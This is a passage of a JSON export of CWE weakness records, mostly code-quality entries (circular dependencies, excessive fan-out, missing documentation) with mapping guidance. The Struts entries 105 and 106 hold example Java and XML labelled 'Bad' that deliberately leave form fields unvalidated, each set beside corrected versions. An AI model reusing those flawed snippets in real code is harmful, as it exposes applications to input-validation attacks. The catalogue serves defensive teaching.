{"ID": "1042", "Name": "Static Member Data Element outside of a Singleton Class Element", "Abstraction": "Variant", "Structure": "Simple", "Status": "Incomplete", "Description": "The code contains a member element that is declared as static (but not final), in which\n\t\t\t\t\tits parent class element \n\t\t\t\t\tis not a singleton class - that is, a class element that can be used only once in\n\t\t\t\t\tthe 'to' association of a Create action.", "ExtendedDescription": "\n\nThis issue can make the product perform more slowly. If the relevant code is reachable by an attacker, then this performance problem might introduce a vulnerability.\n", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "1176", "ViewID": "1000", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Indirect"}], "CommonConsequences": [{"Scope": ["Other"], "Impact": ["Reduce Performance"]}], "MappingNotes": {"Usage": "Prohibited", "Rationale": "This entry is primarily a quality issue with no direct security implications.", "Comments": "Look for weaknesses that are focused specifically on insecure behaviors that have more direct security implications.", "Reasons": ["Other"]}}
{"ID": "1043", "Name": "Data Element Aggregating an Excessively Large Number of Non-Primitive Elements", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "The product uses a data element that has an excessively large\n\t\t\t\t\tnumber of sub-elements with non-primitive data types such as structures or aggregated objects.", "ExtendedDescription": "\n\nThis issue can make the product perform more slowly. If the relevant code is reachable by an attacker, then this performance problem might introduce a vulnerability.\n\n\nWhile the interpretation of \"excessively large\" may vary for each product or developer, CISQ recommends a default of 5 sub-elements.\n", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "1093", "ViewID": "1000", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Indirect"}], "CommonConsequences": [{"Scope": ["Other"], "Impact": ["Reduce Performance"]}], "MappingNotes": {"Usage": "Prohibited", "Rationale": "This entry is primarily a quality issue with no direct security implications.", "Comments": "Look for weaknesses that are focused specifically on insecure behaviors that have more direct security implications.", "Reasons": ["Other"]}}
{"ID": "1044", "Name": "Architecture with Number of Horizontal Layers Outside of Expected Range", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "The product's architecture contains too many - or too few -\n\t\t\t\t\thorizontal layers.", "ExtendedDescription": "\n\nThis issue makes it more difficult to maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.\n\n\nWhile the interpretation of \"expected range\" may vary for each product or developer, CISQ recommends a default minimum of 4 layers and maximum of 8 layers.\n", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "710", "ViewID": "1000", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Indirect"}], "ModesOfIntroduction": [{"Phase": "Architecture and Design"}], "CommonConsequences": [{"Scope": ["Other"], "Impact": ["Reduce Maintainability"]}], "MappingNotes": {"Usage": "Prohibited", "Rationale": "This entry is primarily a quality issue with no direct security implications.", "Comments": "Look for weaknesses that are focused specifically on insecure behaviors that have more direct security implications.", "Reasons": ["Other"]}}
{"ID": "1045", "Name": "Parent Class with a Virtual Destructor and a Child Class without a Virtual Destructor", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "A parent class has a virtual destructor method, but the parent has a child class that does not have a virtual destructor.", "ExtendedDescription": "\n\nThis issue can prevent the product from running reliably, since the child might not perform essential destruction operations. If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability, such as a memory leak (CWE-401).\n", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "1076", "ViewID": "1000", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Indirect"}], "CommonConsequences": [{"Scope": ["Other"], "Impact": ["Reduce Reliability"]}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}}
{"ID": "1046", "Name": "Creation of Immutable Text Using String Concatenation", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "The product creates an immutable text string using string concatenation operations.", "ExtendedDescription": "\n\nWhen building a string via a looping feature (e.g., a FOR or WHILE loop), the use of += to append to the existing string will result in the creation of a new object with each iteration. This programming pattern can be inefficient in comparison with use of text buffer data elements. This issue can make the product perform more slowly. If the relevant code is reachable by an attacker, then this could be influenced to create performance problem.\n", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "1176", "ViewID": "1000", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Indirect"}], "CommonConsequences": [{"Scope": ["Other"], "Impact": ["Reduce Performance"]}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}}
{"ID": "1047", "Name": "Modules with Circular Dependencies", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "The product contains modules in which one module has references that cycle back to itself, i.e., there are circular dependencies.", "ExtendedDescription": "\n\nAs an example, with Java, this weakness might indicate cycles between packages.\n\n\nThis issue makes it more difficult to maintain the product due to insufficient modularity, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.\n\n\nThis issue can prevent the product from running reliably. If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.\n", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "1120", "ViewID": "1000", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Indirect"}], "CommonConsequences": [{"Scope": ["Other"], "Impact": ["Reduce Reliability"]}], "MappingNotes": {"Usage": "Prohibited", "Rationale": "This entry is primarily a quality issue with no direct security implications.", "Comments": "Look for weaknesses that are focused specifically on insecure behaviors that have more direct security implications.", "Reasons": ["Other"]}}
{"ID": "1048", "Name": "Invokable Control Element with Large Number of Outward Calls", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "The code contains callable control elements that\n         contain an excessively large number of references to other\n         application objects external to the context of the callable,\n         i.e. a Fan-Out value that is excessively large.", "ExtendedDescription": "\n\nWhile the interpretation of \"excessively large Fan-Out value\" may vary for each product or developer, CISQ recommends a default of 5 referenced objects.\n\n\nThis issue makes it more difficult to maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.\n", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "710", "ViewID": "1000", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Indirect"}], "CommonConsequences": [{"Scope": ["Other"], "Impact": ["Reduce Maintainability"]}], "MappingNotes": {"Usage": "Prohibited", "Rationale": "This entry is primarily a quality issue with no direct security implications.", "Comments": "Look for weaknesses that are focused specifically on insecure behaviors that have more direct security implications.", "Reasons": ["Other"]}}
{"ID": "1049", "Name": "Excessive Data Query Operations in a Large Data Table", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "The product performs a data query with a large number of joins\n\t\t\t\t\tand sub-queries on a large data table.", "ExtendedDescription": "\n\nThis issue can make the product perform more slowly. If the relevant code is reachable by an attacker, then this performance problem might introduce a vulnerability.\n\n\nWhile the interpretation of \"large data table\" and \"large number of joins or sub-queries\" may vary for each product or developer, CISQ recommends a default of 1 million rows for a \"large\" data table, a default minimum of 5 joins, and a default minimum of 3 sub-queries.\n", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "1176", "ViewID": "1000", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Indirect"}], "CommonConsequences": [{"Scope": ["Other"], "Impact": ["Reduce Performance"]}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}}
{"ID": "105", "Name": "Struts: Form Field Without Validator", "Abstraction": "Variant", "Structure": "Simple", "Status": "Draft", "Description": "The product has a form field that is not validated by a corresponding validation form, which can introduce other weaknesses related to insufficient input validation.", "ExtendedDescription": "Omitting validation for even a single input field may give attackers the leeway they need to compromise the product. Although J2EE applications are not generally susceptible to memory corruption attacks, if a J2EE application interfaces with native code that does not perform array bounds checking, an attacker may be able to use an input validation mistake in the J2EE application to launch a buffer overflow attack.", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "1173", "ViewID": "1000", "Ordinal": "Primary"}, {"Nature": "ChildOf", "CweID": "20", "ViewID": "700", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Primary"}], "ApplicablePlatforms": [{"Type": "Language", "Name": "Java", "Prevalence": "Undetermined"}], "ModesOfIntroduction": [{"Phase": "Implementation", "Note": "Some products use the same ActionForm for more than one purpose. In situations like this, some fields may go unused under some action mappings."}], "CommonConsequences": [{"Scope": ["Integrity"], "Impact": ["Unexpected State"]}, {"Scope": ["Integrity"], "Impact": ["Bypass Protection Mechanism"], "Note": "If unused fields are not validated, shared business logic in an action may allow attackers to bypass the validation checks that are performed for other uses of the form."}], "PotentialMitigations": [{"Phase": ["Implementation"], "Description": "Validate all form fields. If a field is unused, it is still important to constrain it so that it is empty or undefined."}], "DemonstrativeExamples": [{"Entries": [{"IntroText": "In the following example the Java class RegistrationForm is a Struts framework ActionForm Bean that will maintain user input data from a registration webpage for an online business site. The user will enter registration data and, through the Struts framework, the RegistrationForm bean will maintain the user data in the form fields using the private member variables. The RegistrationForm class uses the Struts validation capability by extending the ValidatorForm class and including the validation for the form fields within the validator XML file, validator.xml."}, {"Nature": "Result", "ExampleCode": "```\n\tpublic class RegistrationForm extends org.apache.struts.validator.ValidatorForm {\n```\n// private variables for registration form* \n\t\tprivate String name;\n\t\tprivate String address;\n\t\tprivate String city;\n\t\tprivate String state;\n\t\tprivate String zipcode;\n\t\tprivate String phone;\n\t\tprivate String email;\n\t\t\n\t\tpublic RegistrationForm() {\n\t\t```\n\t\t\tsuper();\n\t\t}\n```\n// getter and setter methods for private variables* \n\t\t...\n\t\t}"}, {"BodyText": "The validator XML file, validator.xml, provides the validation for the form fields of the RegistrationForm."}, {"Nature": "Bad", "Language": "XML", "ExampleCode": "```\n\t<form-validation>\n\t\t<formset>\n\t\t\t<form name=\"RegistrationForm\">\n\t\t\t\t<field property=\"name\" depends=\"required\">\n\t\t\t\t\t<arg position=\"0\" key=\"prompt.name\"/>\n\t\t\t\t</field>\n\t\t\t\t<field property=\"address\" depends=\"required\">\n\t\t\t\t\t<arg position=\"0\" key=\"prompt.address\"/>\n\t\t\t\t</field>\n\t\t\t\t<field property=\"city\" depends=\"required\">\n\t\t\t\t\t<arg position=\"0\" key=\"prompt.city\"/>\n\t\t\t\t</field>\n\t\t\t\t<field property=\"state\" depends=\"required,mask\">\n\t\t\t\t\t<arg position=\"0\" key=\"prompt.state\"/>\n\t\t\t\t\t<var>\n\t\t\t\t\t\t<var-name>mask</var-name>\n\t\t\t\t\t\t<var-value>[a-zA-Z]{2}</var-value>\n\t\t\t\t\t</var>\n\t\t\t\t</field>\n\t\t\t\t<field property=\"zipcode\" depends=\"required,mask\">\n\t\t\t\t\t<arg position=\"0\" key=\"prompt.zipcode\"/>\n\t\t\t\t\t<var>\n\t\t\t\t\t\t<var-name>mask</var-name>\n\t\t\t\t\t\t<var-value>\\d{5}</var-value>\n\t\t\t\t\t</var>\n\t\t\t\t</field>\n\t\t\t</form>\n\t\t</formset>\n\t</form-validation>\n```"}, {"BodyText": "However, in the previous example the validator XML file, validator.xml, does not provide validators for all of the form fields in the RegistrationForm. Validator forms are only provided for the first five of the seven form fields. The validator XML file should contain validator forms for all of the form fields for a Struts ActionForm bean. The following validator.xml file for the RegistrationForm class contains validator forms for all of the form fields."}, {"Nature": "Good", "Language": "XML", "ExampleCode": "```\n\t<form-validation>\n\t\t<formset>\n\t\t\t<form name=\"RegistrationForm\">\n\t\t\t\t<field property=\"name\" depends=\"required\">\n\t\t\t\t\t<arg position=\"0\" key=\"prompt.name\"/>\n\t\t\t\t</field>\n\t\t\t\t<field property=\"address\" depends=\"required\">\n\t\t\t\t\t<arg position=\"0\" key=\"prompt.address\"/>\n\t\t\t\t</field>\n\t\t\t\t<field property=\"city\" depends=\"required\">\n\t\t\t\t\t<arg position=\"0\" key=\"prompt.city\"/>\n\t\t\t\t</field>\n\t\t\t\t<field property=\"state\" depends=\"required,mask\">\n\t\t\t\t\t<arg position=\"0\" key=\"prompt.state\"/>\n\t\t\t\t\t<var>\n\t\t\t\t\t\t<var-name>mask</var-name>\n\t\t\t\t\t\t<var-value>[a-zA-Z]{2}</var-value>\n\t\t\t\t\t</var>\n\t\t\t\t</field>\n\t\t\t\t<field property=\"zipcode\" depends=\"required,mask\">\n\t\t\t\t\t<arg position=\"0\" key=\"prompt.zipcode\"/>\n\t\t\t\t\t<var>\n\t\t\t\t\t\t<var-name>mask</var-name>\n\t\t\t\t\t\t<var-value>\\d{5}</var-value>\n\t\t\t\t\t</var>\n\t\t\t\t</field>\n\t\t\t\t<field property=\"phone\" depends=\"required,mask\">\n\t\t\t\t\t<arg position=\"0\" key=\"prompt.phone\"/>\n\t\t\t\t\t<var>\n\t\t\t\t\t\t<var-name>mask</var-name>\n\t\t\t\t\t\t<var-value>^([0-9]{3})(-)([0-9]{4}|[0-9]{4})$</var-value>\n\t\t\t\t\t</var>\n\t\t\t\t</field>\n\t\t\t\t<field property=\"email\" depends=\"required,email\">\n\t\t\t\t\t<arg position=\"0\" key=\"prompt.email\"/>\n\t\t\t\t</field>\n\t\t\t</form>\n\t\t</formset>\n\t</form-validation>\n```"}]}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}}
{"ID": "1050", "Name": "Excessive Platform Resource Consumption within a Loop", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "The product has a loop body or loop condition that contains a control element that directly or\n\t\t\t\t\tindirectly consumes platform resources, e.g. messaging, sessions, locks, or file\n\t\t\t\t\tdescriptors.", "ExtendedDescription": "\n\nThis issue can make the product perform more slowly. If an attacker can influence the number of iterations in the loop, then this performance problem might allow a denial of service by consuming more platform resources than intended.\n", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "405", "ViewID": "1000", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Indirect"}], "CommonConsequences": [{"Scope": ["Other"], "Impact": ["Reduce Performance"]}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}}
{"ID": "1051", "Name": "Initialization with Hard-Coded Network Resource Configuration Data", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "The product initializes data using hard-coded values that act as network resource identifiers.", "ExtendedDescription": "\n\nThis issue can prevent the product from running reliably, e.g. if it runs in an environment does not use the hard-coded network resource identifiers. If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.\n", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "1419", "ViewID": "1000", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Indirect"}], "CommonConsequences": [{"Scope": ["Other"], "Impact": ["Reduce Reliability"]}], "MappingNotes": {"Usage": "Prohibited", "Rationale": "This entry is primarily a quality issue with no direct security implications.", "Comments": "Look for weaknesses that are focused specifically on insecure behaviors that have more direct security implications.", "Reasons": ["Other"]}}
{"ID": "1052", "Name": "Excessive Use of Hard-Coded Literals in Initialization", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "The product initializes a data element using a hard-coded\n\t\t\t\t\tliteral that is not a simple integer or static constant element.", "ExtendedDescription": "\n\nThis issue makes it more difficult to modify or maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.\n", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "1419", "ViewID": "1000", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Indirect"}], "CommonConsequences": [{"Scope": ["Other"], "Impact": ["Reduce Maintainability"]}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}}
{"ID": "1053", "Name": "Missing Documentation for Design", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "The product does not have documentation that represents how it is designed.", "ExtendedDescription": "\n\nThis issue can make it more difficult to understand and maintain the product. It can make it more difficult and time-consuming to detect and/or fix vulnerabilities.\n", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "1059", "ViewID": "1000", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Indirect"}], "MappingNotes": {"Usage": "Prohibited", "Rationale": "This entry is primarily a quality issue with no direct security implications.", "Comments": "Look for weaknesses that are focused specifically on insecure behaviors that have more direct security implications.", "Reasons": ["Other"]}}
{"ID": "1054", "Name": "Invocation of a Control Element at an Unnecessarily Deep Horizontal Layer", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "The code at one architectural layer invokes code that resides\n\t\t\t\t\tat a deeper layer than the adjacent layer, i.e., the invocation skips at least one\n\t\t\t\t\tlayer, and the invoked code is not part of a vertical utility layer that can be referenced from any horizontal layer.", "ExtendedDescription": "\n\nThis issue makes it more difficult to understand and maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.\n", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "1061", "ViewID": "1000", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Indirect"}], "CommonConsequences": [{"Scope": ["Other"], "Impact": ["Reduce Maintainability"]}], "MappingNotes": {"Usage": "Prohibited", "Rationale": "This entry is primarily a quality issue with no direct security implications.", "Comments": "Look for weaknesses that are focused specifically on insecure behaviors that have more direct security implications.", "Reasons": ["Other"]}}
{"ID": "1055", "Name": "Multiple Inheritance from Concrete Classes", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "The product contains a class with inheritance from more than\n\t\t\t\t\tone concrete class.", "ExtendedDescription": "\n\nThis issue makes it more difficult to maintain the product, which indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities. It also might make it easier to introduce vulnerabilities.\n", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "1093", "ViewID": "1000", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Indirect"}], "CommonConsequences": [{"Scope": ["Other"], "Impact": ["Reduce Maintainability"]}], "MappingNotes": {"Usage": "Prohibited", "Rationale": "This entry is primarily a quality issue with no direct security implications.", "Comments": "Look for weaknesses that are focused specifically on insecure behaviors that have more direct security implications.", "Reasons": ["Other"]}}
{"ID": "1056", "Name": "Invokable Control Element with Variadic Parameters", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "A named-callable or method control element has a signature that\n\t\t\t\t\tsupports a variable (variadic) number of parameters or arguments.", "ExtendedDescription": "\n\nThis issue can prevent the product from running reliably. If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.\n\n\nWith variadic arguments, it can be difficult or inefficient for manual analysis to be certain of which function/method is being invoked.\n", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "1120", "ViewID": "1000", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Indirect"}], "CommonConsequences": [{"Scope": ["Other"], "Impact": ["Reduce Reliability"]}], "MappingNotes": {"Usage": "Prohibited", "Rationale": "This entry is primarily a quality issue with no direct security implications.", "Comments": "Look for weaknesses that are focused specifically on insecure behaviors that have more direct security implications.", "Reasons": ["Other"]}}
{"ID": "1057", "Name": "Data Access Operations Outside of Expected Data Manager Component", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "The product uses a dedicated, central data manager component as required by design, but it contains code that performs data-access operations that do not use this data manager.", "ExtendedDescription": "\n\nThis issue can make the product perform more slowly than intended, since the intended central data manager may have been explicitly optimized for performance or other quality characteristics. If the relevant code is reachable by an attacker, then this performance problem might introduce a vulnerability.\n", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "1061", "ViewID": "1000", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Indirect"}], "CommonConsequences": [{"Scope": ["Other"], "Impact": ["Reduce Performance"]}], "MappingNotes": {"Usage": "Prohibited", "Rationale": "This entry is primarily a quality issue with no direct security implications.", "Comments": "Look for weaknesses that are focused specifically on insecure behaviors that have more direct security implications.", "Reasons": ["Other"]}}
{"ID": "1058", "Name": "Invokable Control Element in Multi-Thread Context with non-Final Static Storable or Member Element", "Abstraction": "Base", "Structure": "Simple", "Status": "Incomplete", "Description": "The code contains a function or method that\n\t\t operates in a multi-threaded environment but owns an unsafe non-final\n\t\t                     static storable or member data element.", "ExtendedDescription": "\n\nThis issue can prevent the product from running reliably. If the relevant code is reachable by an attacker, then this reliability problem might introduce a vulnerability.\n", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "662", "ViewID": "1000", "Ordinal": "Primary"}, {"Nature": "ChildOf", "CweID": "662", "ViewID": "1305", "Ordinal": "Primary"}, {"Nature": "ChildOf", "CweID": "662", "ViewID": "1340", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Indirect"}], "CommonConsequences": [{"Scope": ["Other"], "Impact": ["Reduce Reliability"]}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Base level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not try to 'force' a mapping to a lower-level Base/Variant simply to comply with this preferred level of abstraction.", "Reasons": ["Acceptable-Use"]}}
{"ID": "1059", "Name": "Insufficient Technical Documentation", "Abstraction": "Class", "Structure": "Simple", "Status": "Incomplete", "Description": "The product does not contain sufficient\n         technical or engineering documentation (whether on paper or\n         in electronic form) that contains descriptions of all the\n         relevant software/hardware elements of the product, such as\n         its usage, structure, architectural components, interfaces, design, implementation,\n         configuration, operation, etc.", "ExtendedDescription": "\n\nWhen technical documentation is limited or lacking, products are more difficult to maintain. This indirectly affects security by making it more difficult or time-consuming to find and/or fix vulnerabilities.\n\n\nWhen using time-limited or labor-limited third-party/in-house security consulting services (such as threat modeling, vulnerability discovery, or pentesting), insufficient documentation can force those consultants to invest unnecessary time in learning how the product is organized, instead of focusing their expertise on finding the flaws or suggesting effective mitigations.\n\n\nWith respect to hardware design, the lack of a formal, final manufacturer reference can make it difficult or impossible to evaluate the final product, including post-manufacture verification. One cannot ensure that design functionality or operation is within acceptable tolerances, conforms to specifications, and is free from unexpected behavior. Hardware-related documentation may include engineering artifacts such as hardware description language (HDLs), netlists, Gerber files, Bills of Materials, EDA (Electronic Design Automation) tool files, etc.\n", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "710", "ViewID": "1000", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Indirect"}], "ApplicablePlatforms": [{"Type": "Language", "Class": "Not Language-Specific", "Prevalence": "Undetermined"}, {"Type": "Operating_System", "Class": "Not OS-Specific", "Prevalence": "Undetermined"}, {"Type": "Architecture", "Class": "Not Architecture-Specific", "Prevalence": "Undetermined"}, {"Type": "Technology", "Class": "Not Technology-Specific", "Prevalence": "Undetermined"}, {"Type": "Technology", "Class": "ICS/OT", "Prevalence": "Undetermined"}], "ModesOfIntroduction": [{"Phase": "Architecture and Design"}, {"Phase": "Documentation"}], "CommonConsequences": [{"Scope": ["Other"], "Impact": ["Varies by Context", "Hide Activities", "Reduce Reliability", "Quality Degradation", "Reduce Maintainability"], "Note": "Without a method of verification, one cannot be sure that everything only functions as expected."}], "PotentialMitigations": [{"Phase": ["Documentation", "Architecture and Design"], "Description": "Ensure that design documentation is detailed enough to allow for post-manufacturing verification."}], "ObservedExamples": [{"Reference": "CVE-2022-3203", "Description": "A wireless access point manual specifies that the only method of configuration is via web interface (CWE-1059), but there is an undisclosed telnet server that was activated by default (CWE-912).", "Link": "https://www.cve.org/CVERecord?id=CVE-2022-3203"}], "MappingNotes": {"Usage": "Prohibited", "Rationale": "This entry is primarily a quality issue with no direct security implications.", "Comments": "Look for weaknesses that are focused specifically on insecure behaviors that have more direct security implications.", "Reasons": ["Other"]}}
{"ID": "106", "Name": "Struts: Plug-in Framework not in Use", "Abstraction": "Variant", "Structure": "Simple", "Status": "Draft", "Description": "When an application does not use an input validation framework such as the Struts Validator, there is a greater risk of introducing weaknesses related to insufficient input validation.", "ExtendedDescription": "\n\nUnchecked input is the leading cause of vulnerabilities in J2EE applications. Unchecked input leads to cross-site scripting, process control, and SQL injection vulnerabilities, among others.\n\n\nAlthough J2EE applications are not generally susceptible to memory corruption attacks, if a J2EE application interfaces with native code that does not perform array bounds checking, an attacker may be able to use an input validation mistake in the J2EE application to launch a buffer overflow attack.\n", "RelatedWeaknesses": [{"Nature": "ChildOf", "CweID": "1173", "ViewID": "1000", "Ordinal": "Primary"}, {"Nature": "ChildOf", "CweID": "20", "ViewID": "700", "Ordinal": "Primary"}], "WeaknessOrdinalities": [{"Ordinality": "Primary"}], "ApplicablePlatforms": [{"Type": "Language", "Name": "Java", "Prevalence": "Undetermined"}], "ModesOfIntroduction": [{"Phase": "Implementation"}], "CommonConsequences": [{"Scope": ["Integrity"], "Impact": ["Unexpected State"]}], "PotentialMitigations": [{"Phase": ["Architecture and Design"], "Strategy": "Input Validation", "Description": "Use an input validation framework such as Struts."}, {"Phase": ["Architecture and Design"], "Strategy": "Libraries or Frameworks", "Description": "Use an input validation framework such as Struts."}, {"Phase": ["Implementation"], "Strategy": "Input Validation", "Description": "\n\nUse the Struts Validator to validate all program input before it is processed by the application. Ensure that there are no holes in the configuration of the Struts Validator. Example uses of the validator include checking to ensure that:\n\n\n  - Phone number fields contain only valid characters in phone numbers\n\n  - Boolean values are only \"T\" or \"F\"\n\n  - Free-form strings are of a reasonable length and composition\n\n"}, {"Phase": ["Implementation"], "Strategy": "Libraries or Frameworks", "Description": "\n\nUse the Struts Validator to validate all program input before it is processed by the application. Ensure that there are no holes in the configuration of the Struts Validator. Example uses of the validator include checking to ensure that:\n\n\n  - Phone number fields contain only valid characters in phone numbers\n\n  - Boolean values are only \"T\" or \"F\"\n\n  - Free-form strings are of a reasonable length and composition\n\n"}], "DemonstrativeExamples": [{"Entries": [{"IntroText": "In the following Java example the class RegistrationForm is a Struts framework ActionForm Bean that will maintain user input data from a registration webpage for an online business site. The user will enter registration data and, through the Struts framework, the RegistrationForm bean will maintain the user data."}, {"Nature": "Bad", "Language": "Java", "ExampleCode": "```\n\tpublic class RegistrationForm extends org.apache.struts.action.ActionForm {\n```\n// private variables for registration form* \n\t\tprivate String name;\n\t\tprivate String email;\n\t\t...\n\t\t\n\t\tpublic RegistrationForm() {\n\t\t```\n\t\t\tsuper();\n\t\t}\n```\n// getter and setter methods for private variables* \n\t\t...\n\t\t}"}, {"BodyText": "However, the RegistrationForm class extends the Struts ActionForm class which does use the Struts validator plug-in to provide validator capabilities. In the following example, the RegistrationForm Java class extends the ValidatorForm and Struts configuration XML file, struts-config.xml, instructs the application to use the Struts validator plug-in."}, {"Nature": "Good", "Language": "Java", "ExampleCode": "```\n\tpublic class RegistrationForm extends org.apache.struts.validator.ValidatorForm {\n```\n// private variables for registration form* \n\t\tprivate String name;\n\t\tprivate String email;\n\t\t...\n\t\t\n\t\tpublic RegistrationForm() {\n\t\t```\n\t\t\tsuper();\n\t\t}\n\t\tpublic ActionErrors validate(ActionMapping mapping, HttpServletRequest request) {...}\n```\n// getter and setter methods for private variables* \n\t\t...\n\t\t}"}, {"BodyText": "The plug-in tag of the Struts configuration XML file includes the name of the validator plug-in to be used and includes a set-property tag to instruct the application to use the file, validator-rules.xml, for default validation rules and the file, validation.XML, for custom validation."}, {"Nature": "Good", "Language": "XML", "ExampleCode": "```\n\t<struts-config>\n\t\t<form-beans>\n\t\t\t<form-bean name=\"RegistrationForm\" type=\"RegistrationForm\"/>\n\t\t</form-beans>\n\t\t...\n\t\t<!-- ========================= Validator plugin ================================= -->\n\t\t<plug-in className=\"org.apache.struts.validator.ValidatorPlugIn\">\n\t\t\t<set-property\n\t\t\t\tproperty=\"pathnames\"\n\t\t\t\tvalue=\"/WEB-INF/validator-rules.xml,/WEB-INF/validation.xml\"/>\n\t\t</plug-in>\n\t</struts-config>\n```"}]}], "MappingNotes": {"Usage": "Allowed", "Rationale": "This CWE entry is at the Variant level of abstraction, which is a preferred level of abstraction for mapping to the root causes of vulnerabilities.", "Comments": "Carefully read both the name and description to ensure that this mapping is an appropriate fit. Do not 